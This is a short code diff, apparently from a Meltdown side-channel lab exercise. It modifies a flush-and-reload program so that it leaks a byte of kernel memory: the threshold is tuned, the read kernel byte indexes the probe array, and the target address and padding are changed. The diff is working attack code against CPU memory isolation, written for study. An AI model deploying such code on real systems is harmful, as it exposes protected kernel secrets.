@@ -11,7 +11,7 @@
 /*********************** Flush + Reload ************************/
 uint8_t array[256*4096];
 /* cache hit time threshold assumed*/
-#define CACHE_HIT_THRESHOLD (80)
+#define CACHE_HIT_THRESHOLD (120)
 #define DELTA 1024
 
 void flushSideChannel()
@@ -39,6 +39,7 @@ void reloadSideChannel()
      if (time2 <= CACHE_HIT_THRESHOLD){
          printf("array[%d*4096 + %d] is in cache.\n",i,DELTA);
          printf("The Secret = %d.\n",i);
+	 exit(i);
      }
   }	
 }
@@ -47,10 +48,10 @@ void reloadSideChannel()
 void meltdown(unsigned long kernel_data_addr)
 {
   char kernel_data = 0;
-   
+
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;     
-  array[7 * 4096 + DELTA] += 1;          
+  array[kernel_data * 4096 + DELTA] += 1;          
 }
 
 void meltdown_asm(unsigned long kernel_data_addr)
@@ -59,7 +60,7 @@ void meltdown_asm(unsigned long kernel_data_addr)
    
    // Give eax register something to do
    asm volatile(
-       ".rept 400;"                
+       ".rept 6400;"                
        "add $0x141, %%eax;"
        ".endr;"                    
     
@@ -89,7 +90,15 @@ int main()
   flushSideChannel();
     
   if (sigsetjmp(jbuf, 1) == 0) {
-     meltdown(0xfb61b000);                
+     //Open the /proc/secret_data virtual file.
+     // int fd = open("/proc/secret_data", O_RDONLY);
+     // if (fd < 0) {
+     //   perror("open");
+     //   return -1;
+     // }
+     // int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.
+   
+     meltdown_asm(0xf88a8000);                
   }
   else {
       printf("Memory access violation!\n");
